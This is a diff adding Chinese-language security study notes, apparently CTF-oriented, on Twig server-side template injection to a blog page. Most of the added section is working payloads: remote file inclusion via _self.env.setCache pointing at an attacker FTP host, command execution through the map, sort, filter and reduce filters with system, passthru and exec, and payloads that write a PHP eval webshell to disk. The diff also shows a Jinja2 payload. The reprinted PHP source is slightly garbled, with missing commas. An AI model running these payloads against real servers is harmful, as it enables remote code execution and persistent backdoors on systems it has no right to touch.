@@ -646,6 +646,156 @@ http://node4.anna.nssctf.cn:28698/test
 
 &#123;&#123;(lipsum | attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=globals&amp;b=os&amp;c=tac f*
 </code></pre>
+<h1 id="Twig模板注入"><a href="#Twig模板注入" class="headerlink" title="Twig模板注入"></a>Twig模板注入</h1><p>Twig 是一个灵活、快速、安全的 PHP 模板语言。它将模板编译成经过优化的原始 PHP 代码。Twig 拥有一个 Sandbox 模型来检测不可信的模板代码。Twig 由一个灵活的词法分析器和语法分析器组成，可以让开发人员定义自己的标签，过滤器并创建自己的 DSL。</p>
+<h2 id="过滤器-1"><a href="#过滤器-1" class="headerlink" title="过滤器"></a>过滤器</h2><p>下面这个过滤器的例子会剥去字符串变量<code>name</code>中的 HTML 标签，然后将其转化为大写字母开头的格式:</p>
+<pre><code>&#123;&#123; name|striptags|title &#125;&#125;
+
+// &#123;&#123; '<a>whoami<a>'|striptags|title &#125;&#125;
+// Output: Whoami!
+</code></pre>
+<p>下面这个过滤器将接收一个序列 <code>list</code>，然后使用 <code>join</code> 中指定的分隔符将序列中的项合并成一个字符串：</p>
+<pre><code>&#123;&#123; list|join &#125;&#125;
+&#123;&#123; list|join(', ') &#125;&#125;
+
+// &#123;&#123; ['a', 'b', 'c']|join &#125;&#125;
+// Output: abc
+
+// &#123;&#123; ['a', 'b', 'c']|join('|') &#125;&#125;
+// Output: a|b|c
+</code></pre>
+<p><a href="https://twig.symfony.com/doc/3.x/filters/index.html">更多过滤器</a></p>
+<p>Twig中，可以直接调用内置函数</p>
+<pre><code>&#123;% for i in range(0, 3) %&#125;
+    &#123;&#123; i &#125;&#125;,
+&#123;% endfor %&#125;
+
+// Output: 0, 1, 2, 3,
+</code></pre>
+<p><a href="https://twig.symfony.com/doc/3.x/functions/index.html">更多内置函数</a></p>
+<p><a href="https://twig.symfony.com/doc/3.x/">更多 Twig 的语法参考</a></p>
+<p>全局变量</p>
+<pre><code>_self：引用当前模板名称；（在twig1.x和2.x/3.x作用不一）
+_context：引用当前上下文；
+_charset：引用当前字符集。
+</code></pre>
+<h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><h3 id="Twig-1-x"><a href="#Twig-1-x" class="headerlink" title="Twig 1.x"></a>Twig 1.x</h3><p>三个全局变量</p>
+<pre><code>_self：引用当前模板的实例。
+_context：引用当前上下文。
+_charset：引用当前字符集。
+</code></pre>
+<p>在注入中主要运用<code>_self</code>变量，它会返回当前<code>\Twig\Template</code>实例，并提供了指向 <code>Twig_Environment</code> 的 <code>env</code> 属性，这样我们就可以继续调用 <code>Twig_Environment</code> 中的其他方法，从而进行SSTI</p>
+<p>比如以下 Payload 可以调用 <code>setCache</code> 方法改变 Twig 加载 PHP 文件的路径，在<code> allow_url_include</code> 开启的情况下我们可以通过改变路径实现远程文件包含：</p>
+<pre><code>&#123;&#123;_self.env.setCache("ftp://attacker.net:2121")&#125;&#125;&#123;&#123;_self.env.loadTemplate("backdoor")&#125;&#125;
+</code></pre>
+<p>此外还有 getFilter 方法，其中含有<code>call_user_func</code>可通过传递参数到该函数调用php函数</p>
+<pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("id")&#125;&#125;
+// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>但以上漏洞都只存在于1.x，在后续版本中，_self只会返回当前实例名字符串</p>
+<h1 id="2-x-3-x"><a href="#2-x-3-x" class="headerlink" title="2.x&amp;3.x"></a>2.x&amp;3.x</h1><p>这俩版本<code>_self</code>作用和前一个版本不同，所以不能再用<code>_self</code>来注入</p>
+<p>map过滤器</p>
+<p>map所对应的函数如下</p>
+<pre><code class="php">function twig_array_map($array $arrow)
+&#123;
+$r = [];
+foreach ($array as $k =&gt; $v) &#123;
+$r[$k] = $arrow($v $k);
+&#125;
+​
+return $r;
+&#125;
+</code></pre>
+<p>我们可以看到，传入的<code> $arrow</code>直接就被当成函数执行，即<code> $arrow($v, $k)</code>，而 <code>$v</code>和<code> $k</code>分别是 <code>$array</code>中的 <code>value</code> 和 <code>key</code></p>
+<p>所以<code>$array</code>和<code>$arrow</code>都是我们可控的，那我们就可以找到有两个参数的、可以实现命令执行的危险函数来进行rce</p>
+<p>经过查询，有如下几种常见命令执行函数</p>
+<pre><code>system ( string $command [, int &amp;$return_var ] ) : string
+passthru ( string $command [, int &amp;$return_var ] )
+exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) : string
+shell_exec ( string $cmd ) : string
+</code></pre>
+<p>有两个参数的函数就上面三种，其对应payload</p>
+<pre><code>&#123;&#123;["whoami"]|map("system")&#125;&#125;
+&#123;&#123;["whoami"]|map("passthru")&#125;&#125;
+&#123;&#123;["whoami"]|map("exec")&#125;&#125;    // 无回显
+</code></pre>
+<p>但是当上面的都被ban了呢，我们还有没有其他方法rce</p>
+<p>当然，例如</p>
+<pre><code>file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] ) : int
+</code></pre>
+<p>当我们找到路径后就可以利用该函数进行写shell了</p>
+<pre><code>?name=&#123;&#123;&#123;"<?php phpinfo();eval($_POST[whoami]);":"D:\\phpstudy_pro\\WWW\\shell.php"&#125;|map("file_put_contents")&#125;&#125;
+</code></pre>
+<p>sort过滤器</p>
+<p>类似于map，sort在模板编译时也会进入twig_sort_filter函数</p>
+<pre><code class="php">
+function twig_sort_filter($array, $arrow = null)
+&#123;
+if ($array instanceof \Traversable) &#123;
+$array = iterator_to_array($array);
+&#125; elseif (!\is_array($array)) &#123;
+throw new RuntimeError(sprintf(&#39;The sort filter only works with arrays or &quot;Traversable&quot;, got &quot;%s&quot;.&#39;, \gettype($array)));
+&#125;
+​
+if (null !== $arrow) &#123;
+uasort($array, $arrow);    // 直接被 uasort 调用
+&#125; else &#123;
+asort($array);
+&#125;
+​
+return $array;
+&#125;
+</code></pre>
+<p>可以看到，<code>$array</code>和<code>$arrow</code>直接被<code>uasort</code>调用</p>
+<p>uasort会将数组中的元素按照键值进行排序，当我们自定义一个危险函数时，就可能造成rce</p>
+<p>payload</p>
+<pre><code>&#123;&#123;["id", 0]|sort("system")&#125;&#125;
+&#123;&#123;["id", 0]|sort("passthru")&#125;&#125;
+&#123;&#123;["id", 0]|sort("exec")&#125;&#125;    // 无回显
+</code></pre>
+<p>filter过滤器</p>
+<p>filter过滤器使用箭头函数过滤序列或映射的元素</p>
+<p>类似于map，filter在模板编译时也会进入twig_array_filter函数</p>
+<pre><code class="php">function twig_array_filter($array, $arrow)
+&#123;
+if (\is_array($array)) &#123;
+return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);    // $array 和 $arrow 直接被 array_filter 函数调用
+&#125;
+​
+// the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
+return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
+&#125;
+​
+</code></pre>
+<p>得到payload</p>
+<pre><code>
+&#123;&#123;["id"]|filter("system")&#125;&#125;
+&#123;&#123;["id"]|filter("passthru")&#125;&#125;
+&#123;&#123;["id"]|filter("exec")&#125;&#125;    // 无回显
+​
+&#123;&#123;&#123;"<?php phpinfo();eval($_POST[whoami]);":"D:\\phpstudy_pro\\WWW\\shell.php"&#125;|filter("file_put_contents")&#125;&#125;    // 和map过滤器一样可以写 Webshell
+</code></pre>
+<p>reduce 过滤器</p>
+<pre><code>&#123;% set numbers = [1, 2, 3] %&#125;
+
+&#123;&#123; numbers|reduce((carry, v) => carry + v) &#125;&#125;
+</code></pre>
+<pre><code class="php">
+function twig_array_reduce($array, $arrow, $initial = null)
+&#123;
+if (!\is_array($array)) &#123;
+$array = iterator_to_array($array);
+&#125;
+​
+return array_reduce($array, $arrow, $initial);    // $array, $arrow 和 $initial 直接被 array_reduce 函数调用
+&#125;
+</code></pre>
+<p>array_reduce有三个参数</p>
+<p><code>$array</code>和 <code>$arrow</code>直接被 <code>array_filter</code>函数调用，我们可以利用该性质自定义一个危险函数从而达到rce</p>
+<p>payload</p>
+<pre><code>&#123;&#123;[0, 0]|reduce("system", "id")&#125;&#125;
+&#123;&#123;[0, 0]|reduce("passthru", "id")&#125;&#125;
+&#123;&#123;[0, 0]|reduce("exec", "id")&#125;&#125;    // 无回显
+</code></pre>
 
         </div>
         <!-- .entry-content -->
